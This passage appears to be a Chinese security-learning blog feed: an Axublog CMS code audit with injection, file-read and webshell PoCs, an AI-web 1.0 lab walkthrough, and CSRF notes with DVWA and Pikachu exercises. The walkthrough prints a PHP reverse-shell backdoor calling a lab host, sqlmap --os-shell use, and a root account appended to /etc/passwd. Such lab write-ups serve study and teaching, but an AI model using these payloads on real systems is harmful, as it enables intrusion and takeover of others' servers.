<p><img src="/2020/04/19/axublog-dai-ma-shen-ji-xue-xi/1587018-20200304003116729-1307171520.png" alt="img"></p>
<h5 id="漏洞利用：-2"><a href="#漏洞利用：-2" class="headerlink" title="漏洞利用："></a>漏洞利用：</h5><figure class="highlight dts"><table><tr><td class="code"><pre><span class="line">请求：</span><br><span class="line"><span class="symbol">http:</span><span class="comment">//192.168.110.152/axublog/admin/theme.php?g=edit2save</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">post:</span></span><br><span class="line">path=./shell.php<span class="variable">&amp;content</span>=<span class="params">&lt;?php phpinfo();?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/19/axublog-dai-ma-shen-ji-xue-xi/1587018-20200304003256803-1334544380.png" alt="img"></p>
<h4 id="后台多个sql注入漏洞"><a href="#后台多个sql注入漏洞" class="headerlink" title="后台多个sql注入漏洞"></a>后台多个sql注入漏洞</h4><h5 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h5><p>漏洞点：admin/admin.php</p>
<p>定位edit()函数，发现id参数没有经过过滤而直接带入sql语句进行查询了。</p>
<p><img src="/2020/04/19/axublog-dai-ma-shen-ji-xue-xi/1587018-20200304172222897-1426655107.png" alt="img"></p>
<p>但是这里在获取id参数之前调用了chkoutpost()函数进行验证。跟进chkoutpost()函数。class/c_other.php</p>
<p><img src="/2020/04/19/axublog-dai-ma-shen-ji-xue-xi/1587018-20200304172533350-1121177041.png" alt="img"></p>
<p>chkoutpost()函数仅仅验证了refer是否为空的情况，所以我们在利用这个sql注入漏洞是时候给refer随便赋个值即可。</p>
<p>查看edit函数在哪里被调用了：发现当g=edit时候调用edit函数。</p>
<p><img src="/2020/04/19/axublog-dai-ma-shen-ji-xue-xi/1587018-20200304172752867-937007122.png" alt="img"></p>
<h5 id="漏洞利用：-3"><a href="#漏洞利用：-3" class="headerlink" title="漏洞利用："></a>漏洞利用：</h5><figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line"><span class="symbol">poc:</span></span><br><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.110.152/axublog</span><span class="regexp">/admin/admin</span>.php?g=edit&amp;id=<span class="number">1</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> 1,<span class="title">version</span>(),3,4--+</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">Referer:</span> 任意填写</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/19/axublog-dai-ma-shen-ji-xue-xi/1587018-20200304172922428-724640530.png" alt="img"></p>
<p>6，既然这个cms的sql注入都没有进行防御，那么肯定还存在n个sql注入漏洞，此处就不一一说明了。</p>
<h4 id="任意文件读取漏洞"><a href="#任意文件读取漏洞" class="headerlink" title="任意文件读取漏洞"></a>任意文件读取漏洞</h4><p>漏洞点：admin/app.php</p>
<p>首先定位到edit2()函数，在edit2函数中通过调用file_get_contents函数获取变量path文件中的内容，然而变量path文件中的内容，然而变量path的值是通过request的方式从path参数获取的，并且对变量$path没有任何过滤而直接带入到file_get_contents函数进行获取文件内容，所以此处就造成了任意文件读取漏洞。</p>
<p><img src="/2020/04/19/axublog-dai-ma-shen-ji-xue-xi/1587018-20200304173840167-1365630191.png" alt="img"></p>
<p>跟进edit2()函数，寻找调用方法：当g=edit2的时候调用edit2函数。</p>
<p><img src="/2020/04/19/axublog-dai-ma-shen-ji-xue-xi/1587018-20200304174437952-1224821444.png" alt="img"></p>
<p>漏洞利用：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">poc:</span><br><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">110.152</span><span class="regexp">/axublog/</span>admin<span class="regexp">/app.php?g=edit2&amp;path=./</span>app.php</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/19/axublog-dai-ma-shen-ji-xue-xi/1587018-20200304174618584-506013891.png" alt></p>
<h4 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h4><p>漏洞点：admin/html.php</p>
<p>漏洞分析：在生成about页面的时候调用了ob_get_contents函数执行about.mb里面的php代码，并且没有进行任何过滤，所以我们可以通过向about.md文件中写入php代码，从而使其被执行。然而在后台管理页面中正好有编辑about页功能。</p>
<p><img src="/2020/04/19/axublog-dai-ma-shen-ji-xue-xi/1587018-20200304210913536-1220729563.png" alt="img"></p>
<p>漏洞利用：</p>
<p>首先编辑about页，然后向其中写入想要执行的php代码即可，此处我使用file_put_contents函数生成一个文件名为shell2.php的探针文件。</p>
<p><img src="/2020/04/19/axublog-dai-ma-shen-ji-xue-xi/1587018-20200304211607584-434322337.png" alt="img"></p>
<p>保存编辑后选择生成about：</p>
<p><img src="/2020/04/19/axublog-dai-ma-shen-ji-xue-xi/1587018-20200304211905560-277463672.png" alt="img"></p>
<p>然后我们的代码就被成功的执行了，访问shell2.php:</p>
<p><img src="/2020/04/19/axublog-dai-ma-shen-ji-xue-xi/1587018-20200304212324112-1387100175.png" alt="img"></p>
<h5 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h5><p><a href="http://www.ttk7.cn/post-82.html" target="_blank" rel="noopener">http://www.ttk7.cn/post-82.html</a></p>
<p><a href="https://blog.csdn.net/sweet0swat/article/details/89056383" target="_blank" rel="noopener">https://blog.csdn.net/sweet0swat/article/details/89056383</a></p>
]]></content>
      <categories>
        <category>php代码审计学习</category>
      </categories>
      <tags>
        <tag>Axublog</tag>
      </tags>
  </entry>
  <entry>
    <title>AI-web1.0靶机学习</title>
    <url>/2020/03/12/ai-web1-0-ba-ji-xue-xi/</url>
    <content><![CDATA[<h2 id="AI-web-1-0靶机学习"><a href="#AI-web-1-0靶机学习" class="headerlink" title="AI-web 1.0靶机学习"></a>AI-web 1.0靶机学习</h2><h4 id="第一步、主机发现"><a href="#第一步、主机发现" class="headerlink" title="第一步、主机发现"></a>第一步、主机发现</h4><p>我们尝试使用nmap的二层发现功能进行主机扫描</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -sn <span class="number">192.168</span><span class="number">.153</span><span class="number">.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/12/ai-web1-0-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200206185007.png" alt></p>
<h4 id="第二步、端口扫描"><a href="#第二步、端口扫描" class="headerlink" title="第二步、端口扫描"></a>第二步、端口扫描</h4><p>我们初步确定靶机IP为192.168.153.135后，继续使用nmap进行端口扫描和信息收集。</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -A -p <span class="number">1</span><span class="number">-65535</span> <span class="number">192.168</span><span class="number">.153</span><span class="number">.135</span> -T4</span><br></pre></td></tr></table></figure>



<p><img src="/2020/03/12/ai-web1-0-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200206185240.png" alt></p>
<p>我们发现靶机的80端口上运行apache服务，并且发现了一个文件上传的目录</p>
<p>我们尝试访问该ip的80端口,发现页面只有一句没什么用的话。。。</p>
<p><img src="/2020/03/12/ai-web1-0-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200206185640.png" alt></p>
<h4 id="第三步、web信息收集"><a href="#第三步、web信息收集" class="headerlink" title="第三步、web信息收集"></a>第三步、web信息收集</h4><p>我们使用dirsearch工具尝试扫一下网站的目录。</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">dirb <span class="string">http:</span><span class="comment">//192.168.153.135</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/12/ai-web1-0-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200206185739.png" alt></p>
<p>发现目录下存在robots.txt文件，我们看看里面有没有什么敏感文件。</p>
<p><img src="/2020/03/12/ai-web1-0-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200206185821.png" alt></p>
<p>文件里给出了三个目录，我们依次进行访问，发现只有 /se3reTdir777/目录可以正常访问，发现是一个登陆点。</p>
<p><img src="/2020/03/12/ai-web1-0-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200206190345.png" alt></p>
<p>我们输入任意数字，进行抓包判断，发现明显的注入点uid。使用sqlmap进行自动化扫描。</p>
<p><img src="/2020/03/12/ai-web1-0-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200206190358.png" alt></p>
<h4 id="第四步、sqlmap自动化注入"><a href="#第四步、sqlmap自动化注入" class="headerlink" title="第四步、sqlmap自动化注入"></a>第四步、sqlmap自动化注入</h4><p>我们使用sqlmap进行自动化扫描。</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">"http://192.168.153.135/se3reTdir777/"</span> <span class="params">--data</span> <span class="string">"uid=1&amp;peration=Submit"</span> <span class="params">--dbs</span> <span class="params">--batch</span></span><br></pre></td></tr></table></figure>

<p>得到了我们想要的数据库 aiweb1</p>
<p><img src="/2020/03/12/ai-web1-0-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200206190647.png" alt></p>
<p>继续对目标数据库中的表进行探测</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">"http:192.168.153.135/se3reTdir777/"</span><span class="params">--data</span> <span class="string">"uid=1&amp;peration=Submit"</span> -D  aiweb1 <span class="params">--tables</span> <span class="params">--batch</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/12/ai-web1-0-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200206190733.png" alt></p>
<p>探测字段</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.153.135/se3reTdir777/"</span> --data <span class="string">"uid=1&amp;Operation=Submit"</span>  -D aiweb1 -T<span class="built_in"> user </span>--columns --batch</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/12/ai-web1-0-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200206190849.png" alt></p>
<p>发现没有我们想要的信息。。。。。。只能换思路。</p>
<h4 id="第五步、sqlmap反弹shell"><a href="#第五步、sqlmap反弹shell" class="headerlink" title="第五步、sqlmap反弹shell"></a>第五步、sqlmap反弹shell</h4><p>我们发现之前robots下存在一个 /m3diNf0/ 目录禁止访问，我们这里再次对其进行爆破。</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">dirb http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">153.135</span><span class="regexp">/m3diNf0/</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/12/ai-web1-0-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200215110747.png" alt></p>
<p>我们发现目录下存在一个info.php，我们尝试对其进行访问。</p>
<p><img src="/2020/03/12/ai-web1-0-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200206192302.png" alt></p>
<p>发现这是一个phpinfo配置页面。并且在其中发现了网站的根目录在home下。</p>
<p>知道了网站的根目录，我们就可以尝试使用sqlmap反弹shell。</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.153.135/se3reTdir777/"</span> <span class="params">--data</span> <span class="string">"uid=1&amp;Operation=Submit"</span> <span class="params">--level=3</span> <span class="params">--os-shell</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/12/ai-web1-0-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200215112454.png" alt></p>
<p>依次选择4:php web server</p>
<p>​                2:custom location</p>
<p>网站路径：/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/</p>
<p>​                PS：优先选择此路径的原因是sql注入在该页面下。</p>
<h4 id="第六步、php后门反弹shell"><a href="#第六步、php后门反弹shell" class="headerlink" title="第六步、php后门反弹shell"></a>第六步、php后门反弹shell</h4><p>​    提示需要一个终端，所以我们得想办法反弹一个shell。在这里我们已经得到一个shell，可以写一个后门，在这里写一个php后门。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$sock=fsockopen(<span class="string">"192.168.153.152"</span>,<span class="number">4567</span>);</span><br><span class="line">exec(<span class="string">"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>我们尝试访问本地的127.0.0.1的4567端口。发现可以正常访问目录下的文件。</p>
<p><img src="/2020/03/12/ai-web1-0-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200215114220.png" alt></p>
<p>我们在shell下载下a.php文件。</p>
<p><img src="/2020/03/12/ai-web1-0-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200215114406.png" alt></p>
<p>我们在kali下监听 9966端口。</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nc -lvp <span class="number">9966</span></span><br></pre></td></tr></table></figure>

<p>然后我们在使用php命令运行我们下载的php后门。</p>
<p><img src="/2020/03/12/ai-web1-0-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200215114646.png" alt></p>
<p>我们可以发现kali已经成功反弹shell。</p>
<h4 id="第七步、提权获得flag"><a href="#第七步、提权获得flag" class="headerlink" title="第七步、提权获得flag"></a>第七步、提权获得flag</h4><p>我们首先使用ptthon提升为交互式shell:</p>
<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line">python -<span class="built_in">c</span> '<span class="keyword">import</span> pty;pty.spawn("/bin/bash")'</span><br></pre></td></tr></table></figure>

<p>​    发现当前用户不是root用户但是这个用户可以对/etc/passwd 文件进行写入权限，所以我们试着添加一个用户看看： 因为写入的时候密码是加密的，所以要先加密密码:</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">openssl passwd <span class="number">-1</span> -salt abc <span class="number">000000</span></span><br></pre></td></tr></table></figure>

<p>再写入密码：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">echo <span class="string">'abc'</span>:<span class="variable">$1</span><span class="variable">$abc</span><span class="variable">$yzqAxwzjwao0BUFj9nRwF</span><span class="regexp">/:0:0::/</span>root：<span class="regexp">/bin/</span>bash<span class="string">'&gt;&gt;/etc/passwd</span></span><br></pre></td></tr></table></figure>

<p>最后使用su命令切换为root用户。得到Flag.</p>
<p><img src="/2020/03/12/ai-web1-0-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200215115210.png" alt></p>
<p><strong>完</strong></p>
]]></content>
      <categories>
        <category>渗透测试学习</category>
      </categories>
      <tags>
        <tag>AI-web 1.0</tag>
      </tags>
  </entry>
  <entry>
    <title>CSRF漏洞学习</title>
    <url>/2020/04/03/csrf-lou-dong-xue-xi/</url>
    <content><![CDATA[<h2 id="CSRF漏洞笔记-靶场实战"><a href="#CSRF漏洞笔记-靶场实战" class="headerlink" title="CSRF漏洞笔记+靶场实战"></a>CSRF漏洞笔记+靶场实战</h2><h3 id="CSRF漏洞部分"><a href="#CSRF漏洞部分" class="headerlink" title="CSRF漏洞部分"></a>CSRF漏洞部分</h3><h4 id="CSRF简述"><a href="#CSRF简述" class="headerlink" title="CSRF简述"></a>CSRF简述</h4><h5 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>​    CSRF攻击建立在浏览器和Web服务器的对话之中，并且能欺骗用户访问url，发起的目标是通过伪造的用户请求，该请求不是用户想发出去的请求，对服务器或服务来说，该请求是完全合法的请求，但却完成了攻击者的期望操作。</p>
<p>​    从代码上看，CSRF能攻击成功是攻击者猜到了你重要参数，因而伪造请求。</p>
<p>​    可以这么理解CSRF攻击：攻击者盗用了你的身份，以你的名义进行某些非法操作。CSRF能够使用你的账户发送邮件，获取你的敏感信息，甚至盗走你的账户</p>
<p><strong>浏览器Cookie机制：</strong></p>
<p>cookie的两种表现形式：一种是本地Cookie，又称持久性Cookie；</p>
<p>　　　　　　　　　　  一种是临时Cookie，又称Session Cookie；：</p>
<h5 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h5><p>1.攻击者必须在目标站点找到一个表单的提交入口，或者有类似的URL(例如用来转钱，修改受害者邮箱或者密码)</p>
<p>2.目标站点不能有检测referer头操作，或者被攻击者的浏览器允许referer欺骗</p>
<p>3.攻击者必须了解表单或者URL参数中的正确的值，如果有秘密验证值或者ID，攻击者没有猜对，攻击者很可能不成功。</p>
<p>4。攻击者必须诱使受害者访问有恶意代码的页面，并且此时受害者已经登录到目标站点。</p>
<h5 id="漏洞利用场景"><a href="#漏洞利用场景" class="headerlink" title="漏洞利用场景"></a>漏洞利用场景</h5><ul>
<li>有意义的操作（如修改密码）</li>
<li>验证过于简单（参数固定、我们可以设置参数）</li>
</ul>
<p><strong>漏洞类型</strong></p>
<ul>
<li>GET型</li>
<li>POST型</li>
</ul>
<h5 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h5><p>1.手工检测：抓包查看是否存在无token无referer验证这种情况。存在的话就会有CSRF漏洞</p>
<p>​                       如果存在无token有referer验证这种情况时，我们可以尝试空referer绕过或者尝试抓包伪造referer  </p>
<p>2.半自动检测：常用半自动检测漏洞的软件有CSRFTester,CSRF Request Builder等。</p>
<h5 id="漏洞挖掘："><a href="#漏洞挖掘：" class="headerlink" title="漏洞挖掘："></a>漏洞挖掘：</h5><p><strong>1、自动化扫描工具</strong></p>
<p>netspark</p>
<p>AWVS</p>
<p>appscan</p>
<p>一般用上列工具可以扫描到网站是否存在CSRF漏洞。但是在工具中添加登录参数可以大大提高挖掘的成功率</p>
<p><strong>2、半自动检测工具</strong></p>
<p>CSRFTester</p>
<p>下载地址：<a href="https://www.owasp.org/index.php/File:CSRFTester-1.0.zip" target="_blank" rel="noopener">https://www.owasp.org/index.php/File:CSRFTester-1.0.zip</a></p>
<p>1.安装CSRFTester</p>
<p><img src="/2020/04/03/csrf-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20200123184231.png" alt="1.jpg"></p>
<p>打开run.bat就可以打开工具，但是需要java的环境</p>
<p><img src="/2020/04/03/csrf-lou-dong-xue-xi/2-1024x622.jpg" alt="2.jpg">)<img src="/2020/04/03/csrf-lou-dong-xue-xi/21-1024x622.jpg" alt="2.jpg"></p>
<p>消息框出现该消息时，表示工具已经开始监听本地8008这个端口了，这个时候需要配置浏览器的代理</p>
<p>\2. 设置浏览器代理（搜狗浏览器为例）</p>
<p>点击工具栏–代理设置–添加新代理，将代理进行添加并启用即可</p>
<p><img src="/2020/04/03/csrf-lou-dong-xue-xi/3-1024x584.png" alt="3.png"></p>
<p>\3. 用户登录</p>
<p>单击“Start Recording”，开启CSRFTester的检测工作，这样以后我们所有访问的URL以及参数都会被记录下来。</p>
<p>\4. 通过CSRFTester抓取和伪造请求</p>
<p>当你登录一个网站账号时，CSRF Tester会进行抓取</p>
<p><img src="/2020/04/03/csrf-lou-dong-xue-xi/9.png" alt="9.png"></p>
<p>我们抓取了该请求，在Step属性中添加请求，然后将Form Parameter中的user等表单中参数进行修改，然后单击Generate HTML按钮（可以选择其他格式：Forms、IFrame等）来产生CSRF攻击脚本。</p>
<p><img src="/2020/04/03/csrf-lou-dong-xue-xi/10-1024x659.png" alt="10.png"></p>
<p>随机生成了一个攻击脚本，将其上传服务器，发送给受害者即可。</p>
<p>CSRF PoC generator</p>
<p>打开burpsuite，在抓取任意一个HTTP请求中点击右键，选择Engagement tools，然后点击Generate CSRF POC即可生成CSRF POC，</p>
<p><img src="/2020/04/03/csrf-lou-dong-xue-xi/8-1024x822.png" alt="8.png">)<img src="https://www.secpulse.com/wp-content/themes/secpulse2017/js/editor/themes/default/images/spacer.gif" alt="img"></p>
<p>这款工具也是根据请求参数生成的POC，可以直接点击test in browser按钮进行测试，点击后会利用这段POC进行攻击。</p>
<p>上列两款工具可以拦截所有的请求，渗透测试人员可以在登录状态下进行修改密码、删除文件等操作，工具便会将发送的请求进行拦截，再通过工具生成的POC便可以验证漏洞是否存在。</p>
<p>1.CSRFTester设置浏览器代理:127.0.0.1:8008，bp是8080</p>
<p>2.登录web应用程序，提交表单，在CSRF工具中修改表单内容，查看是否更改，如果更改就存在CSRF漏洞</p>
<p>3.生成POC<br>一个wordpress博客为例就存在一个CSRF漏洞<br>创建用户，bp抓包，修改添加用户的账号密码<br>[<img src="/2020/04/03/csrf-lou-dong-xue-xi/20190802112041-81ebadd4-b4d4-1.png" alt="img">]<br>发送到CSRF POC<br>[<img src="/2020/04/03/csrf-lou-dong-xue-xi/20190802112102-8e91ff5c-b4d4-1.png" alt="img">]<br>以html形式保存下来，发送给目标用户欺骗他打开，成功创建一个新账户<br>[<img src="/2020/04/03/csrf-lou-dong-xue-xi/20190802112122-9a57c2f4-b4d4-1.png" alt="img">]</p>
<h5 id="常见的防御方法："><a href="#常见的防御方法：" class="headerlink" title="常见的防御方法："></a>常见的防御方法：</h5><ul>
<li><p><strong>使用验证码：</strong></p>
<p>验证码强制用户必须和应用进行交互，才能完成最终的请求</p>
</li>
<li><p><strong>验证HTTP referer字段：</strong></p>
<p>HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，会带上Referer，通过验证Referer，可以判断请求的合法性，如果Referer是其他网站的话，就有可能是CSRF攻击，则拒绝该请求。</p>
</li>
<li><p><strong>在请求地址中添加token并验证：</strong></p>
<p>在HTTP请求中以参数的形式加入一个随机产生的token，并在服务器端建立一个拦截器来验证这个token，如果请求中没有token或者token不正确，则认为可能是CSRF攻击而拒绝该请求。</p>
</li>
</ul>
<h4 id="DVWA（CSRF部分）"><a href="#DVWA（CSRF部分）" class="headerlink" title="DVWA（CSRF部分）"></a>DVWA（CSRF部分）</h4><h5 id="simple"><a href="#simple" class="headerlink" title="simple:"></a>simple:</h5><img src="/2020/04/03/csrf-lou-dong-xue-xi/QQ截图20200123184231.png" style="zoom:50%;">

<p><strong>分析：</strong></p>
<p>​      我们分析源代码可知，服务器收到修改密码的请求后，会检查参数password_new password_conf是否相同，如果相同，就会修改密码，并没有任何的防CSRF机制，所以我们只需要用户在cookie还有效的时间内在相同的浏览器访问我们给定的url（该操作是服务器对请求的发送者进行了身份验证，检查cookie），就可以实现CSRF攻击，修改用户密码。</p>
<p><strong>漏洞利用</strong></p>
<p>我们可以构造如下URL进行修改密码：</p>
<p><a href="http://localhost/DVWA/vulnerabilities/csrf/?password_new=admin&amp;password_conf=admin&amp;Change=Change#" target="_blank" rel="noopener">http://localhost/DVWA/vulnerabilities/csrf/?password_new=admin&amp;password_conf=admin&amp;Change=Change#</a></p>
<p>我们构造一个html表单提交页面</p>
<img src="/2020/04/03/csrf-lou-dong-xue-xi/QQ截图20200128112112.png" style="zoom:67%;">

<p>将html文件放入本地网站的根目录下。</p>
<p>我们尝试在本地访问该网页</p>
<img src="/2020/04/03/csrf-lou-dong-xue-xi/QQ截图20200128112036.png" style="zoom:50%;">



<p>点击后发现跳转到了DVWA更改密码界面，密码被修改</p>
<img src="/2020/04/03/csrf-lou-dong-xue-xi/QQ截图20200128112051.png" style="zoom:67%;">



<h5 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Checks to see where the request came from</span></span><br><span class="line">    <span class="keyword">if</span>( stripos( $_SERVER[ <span class="string">'HTTP_REFERER'</span> ] ,$_SERVER[ <span class="string">'SERVER_NAME'</span> ]) !== <span class="keyword">false</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        $pass_new  = $_GET[ <span class="string">'password_new'</span> ];</span><br><span class="line">        $pass_conf = $_GET[ <span class="string">'password_conf'</span> ];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Do the passwords match?</span></span><br><span class="line">        <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">            <span class="comment">// They do!</span></span><br><span class="line">            $pass_new = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $pass_new ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">            $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Update the database</span></span><br><span class="line">            $insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>;</span><br><span class="line">            $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for the user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Issue with passwords matching</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Didn't come from a trusted source</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;That request didn't look correct.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>分析：</strong></p>
<p>Medium级别的代码检查了保留变量 HTTP_REFERER（http包头的Referer参数的值，表示来源地址）中是否包含SERVER_NAME（http包头的Host参数，及要访问的主机名，这里是192.168.153.130），希望通过这种机制抵御CSRF攻击</p>
<p><strong>漏洞利用：</strong></p>
<p>我们用burp对数据进行抓包，不断对referer进行修改，最后发现referer需包含我们host名</p>
<img src="/2020/04/03/csrf-lou-dong-xue-xi/QQ截图20200128112923.png" style="zoom: 67%;">





<p>查阅资料了解到referer参数和链接相同，我们可以将Html文件名中包含127.0.0.1,比如将html文件修改为</p>
<p>127.0.0.1.html</p>
<p><img src="/2020/04/03/csrf-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20200128113629.png" alt></p>
<p>我们在浏览器打开127.0.0.1.html，点击submit</p>
<p><img src="/2020/04/03/csrf-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20200128113414.png" alt></p>
<p>我们发现密码成功修改。</p>
<p><strong>high</strong></p>
<p>high等级我们发现在url中多了user_token,并且每次修改密码user_token都随着变化</p>
<p>usr_token的职责：它的职责是保护用户的用户名及密码多次提交，以防密码泄露。</p>
<p><img src="/2020/04/03/csrf-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20200128114230.png" alt></p>
<p>如果该页面不存在XSS漏洞时，此方法就可以有效杜绝CSRF漏洞</p>
<p>但我们可以通过利用DVWA的XSS漏洞进行有效利用</p>
<p><strong>利用过程</strong></p>
<p>我们首先利用dvwa的XSS漏洞获取浏览器cookie.</p>
<img src="/2020/04/03/csrf-lou-dong-xue-xi/QQ截图20200128114910.png" style="zoom:50%;">

<p>然后我们回到构造好的CSRF页面提交用Burp进行抓包</p>
<img src="/2020/04/03/csrf-lou-dong-xue-xi/QQ截图20200128115317.png" style="zoom:67%;">

<p>我们使用获取到的cookie进行替换，然后发包即可成功修改密码。</p>
<p><strong>impossibe</strong></p>
<img src="/2020/04/03/csrf-lou-dong-xue-xi/QQ截图20200128120628.png" style="zoom:50%;">

<p>它提示了要输入原始密码，这就保证了当前用户一定是本人，有效的确保了CSRF攻击。</p>
<h4 id="Pikachu平台-CSRF部分）"><a href="#Pikachu平台-CSRF部分）" class="headerlink" title="Pikachu平台(CSRF部分）"></a>Pikachu平台(CSRF部分）</h4><p><img src="/2020/04/03/csrf-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20200129173327.png" alt></p>
<h5 id="CSRF-GET"><a href="#CSRF-GET" class="headerlink" title="CSRF(GET)"></a>CSRF(GET)</h5><p>我们首先根据右上角的提示登录账号</p>
<img src="/2020/04/03/csrf-lou-dong-xue-xi/QQ截图20200129173354.png" style="zoom:50%;">





<img src="/2020/04/03/csrf-lou-dong-xue-xi/QQ截图20200129173746.png" style="zoom:67%;">



<p>我们选择修改个人信息并用burp抓包</p>
<img src="/2020/04/03/csrf-lou-dong-xue-xi/QQ截图20200129173928.png" style="zoom:80%;">

<p>提交的请求来看，后台没做CSRF token，同时也是通过GET请求来提交修改信息，我们拿到这个请求，伪造一个请求链接，然后让kobe点击就好，我们构造的URL中把地址add改为hack。kobe一点击就修改了地址。</p>
